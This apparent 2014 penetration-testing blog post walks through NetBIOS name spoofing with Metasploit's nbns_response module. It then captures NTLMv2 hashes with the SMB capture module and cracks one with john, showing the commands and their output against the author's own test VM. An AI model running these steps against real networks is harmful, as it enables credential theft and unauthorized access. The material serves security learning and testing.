---
title: "NetBIOS Name Spoofing and SMB"
date: "2014-06-05T12:00:00-04:00"
url: "/posts/netbios-name-spoofing-and-smb"
categories:
- infosec
tags:
- pentesting
- netbios
- smb
- authentication
summary: "NBNS still works!"
---

This is a fun technique for harvesting user credentials that still works:
NetBIOS name spoofing. NetBIOS is a Session layer technology from the early
1980's that is still in use on networks today. Today, NetBIOS is used
predominately in Windows networks as the session service for Server Message
Block (SMB) aka Common Internet File System (CIFS), an Application layer
technology for sharing files, printers, and inter process communication (IPC).

# Start the NetBIOS Name Spoofing

Using Metasploit, load the auxiliary/spoof/nbns/nbns_response module:

```
msf> use auxiliary/spoof/nbns/nbns_response
msf auxiliary(nbns_response) > show options

Module options (auxiliary/spoof/nbns/nbns_response):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   INTERFACE                   no        The name of the interface
   REGEX      .*               yes       Regex applied to the NB Name to determine if spoofed reply is     sent
   SPOOFIP    127.0.0.1        yes       IP address with which to poison responses
   TIMEOUT    500              yes       The number of seconds to wait for new data
```

We are most interested in the "SPOOFIP" option, as this is the IP address our
spoofed responses will come from. Note that this module will not work well with
Network Address Translation (NAT), as the NetBIOS protocol itself is not
NAT-friendly see [this article][faughnan]. The "REGEX" option allows you to
match on parts of the NetBIOS name you want to target, if you are targeting a
specific host on the network. If this is left blank, all NetBIOS requests to
your host will be handled by this module.

# Useful NetBIOS Spoofing

Now that we can spoof a legitimate host's NetBIOS response, let's use this
capability to capture a user's NTLM hash from SMB requests. For detailed
information on NTLM authentication over SMB, [see Microsoft's documentation on
MSDN][MSFT-NTLM-SMB]. In summary, a typical NTLM authentication session over SMB
looks like this:

1. Client sends SMB_COM_NEGOTIATE request
2. Server replies with SMB_COM_NEGOTIATE response
3. Client sends NTLM NEGOTIATE_MESSAGE request
4. Server replies with NTLM CHALLENGE_MESSAGE response
5. Client sends NTLM AUTHENTICATE_MESSAGE request
6. Server replies with SMB_COM_SESSION_SETUP response

We will attack the negotiations in steps 4 and 5 using a Metasploit module to
create a service which will respond to SMB requests. This will afford us the
opportunity to create a predictable NTLM CHALLENGE_MESSAGE (Step 4) for
submission to the client. This message normally includes an 8-bit random value,
however, since we are the SMB server, we can control the value. When the client
responds to this challenge with NTLM AUTHENTICATE_MESSAGE, it will include the
NTLM hash of the user's password!

From Metasploit, load the auxiliary/server/capture/smb module:

~~~~
msf auxiliary(nbns_response) > use auxiliary/server/capture/smb
msf auxiliary(smb) > show options

Module options (auxiliary/server/capture/smb):

   Name        Current Setting   Required  Description
   ----        ---------------   --------  -----------
   CAINPWFILE                    no        The local filename to store the hashes in Cain&Abel format
   CHALLENGE   1122334455667788  yes       The 8 byte challenge 
   JOHNPWFILE                    no        The prefix to the local filename to store the hashes in JOHN format
   SRVHOST     0.0.0.0           yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT     445               yes       The local port to listen on.
   SSL         false             no        Negotiate SSL for incoming connections
   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
   SSLVersion  SSL3              no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
~~~~

Most of these values are fine left as default, but take note of the CAINPWFILE
and JOHNPWFILE settings. These will dump client responses into files prepared
for use by these tools. Awesome! I prefer to use john for password attacks, so I
will set the JOHNPWFILE and begin the exploit:

~~~~
msf auxiliary(smb) > set JOHNPWFILE /tmp/john_pw.log
JOHNPWFILE => /tmp/john_pw.log
msf auxiliary(smb) > exploit -j -z
[*] Auxiliary module running as background job
~~~~

Now I just need to wait for a victim to connect...  (Here I am forcing the
connection from a Windows 7 VM)

Here's what the client sees:

{{< figure src="/images/2014/06-05-1.png" caption="SMB auth" >}}

And here's what we capture on our end: 

{{< figure src="/images/2014/06-05-2.png" caption="SMB capture" >}}

Almost there. Now, run `john` against the NTLM hash...

```bash
$ john --wordlist=/tmp/wordlist.txt john_pw.log_netntlmv2
Loaded 4 password hashes with 4 different salts (NTLMv2 C/R MD4 HMAC-MD5 [32/64])
eve              (dagorim)
```

Great! Now it's time for further fun.

# Not the Newest Tool in the Box

This technique still works, though. 

[faughnan]: http://www.faughnan.com/netbios.html
[MSFT-NTLM-SMB]: http://msdn.microsoft.com/en-us/library/cc669093.aspx
